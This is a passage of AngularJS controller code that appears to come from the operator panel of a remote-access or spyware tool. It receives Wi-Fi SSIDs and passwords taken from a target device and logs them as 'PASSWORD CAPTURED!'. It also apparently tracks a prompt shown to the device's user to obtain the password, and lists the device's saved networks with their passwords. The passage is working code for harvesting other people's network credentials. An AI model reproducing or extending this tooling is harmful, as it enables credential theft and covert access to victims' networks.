                ssid: data.ssid,
                password: data.password
            };
            $rootScope.Log(`[✓] PASSWORD CAPTURED! SSID: ${data.ssid}, Password: ${data.password}`, CONSTANTS.logStatus.SUCCESS);
            
            // Also add to networks list
            $WiFiPwdCtrl.wifiNetworks.unshift({
                ssid: data.ssid,
                password: data.password,
                security: 'Captured',
                showPassword: true
            });
        } else if (data.message && data.instruction) {
            // Prompt shown confirmation
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $WiFiPwdCtrl.error = {
                title: 'Failed to retrieve passwords',
                message: data.error
            };
            $rootScope.Log(`[✗] WiFi passwords error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.networks) {
            $WiFiPwdCtrl.wifiNetworks = data.networks.map(n => ({ ...n, showPassword: false }));
            $rootScope.Log(`[✓] Found ${data.networks.length} saved WiFi networks`, CONSTANTS.logStatus.SUCCESS);
            
            if (data.note) {
                $rootScope.Log(`[!] ${data.note}`, CONSTANTS.logStatus.WARN);
            }
        }
        
        $WiFiPwdCtrl.$apply();
    });
});
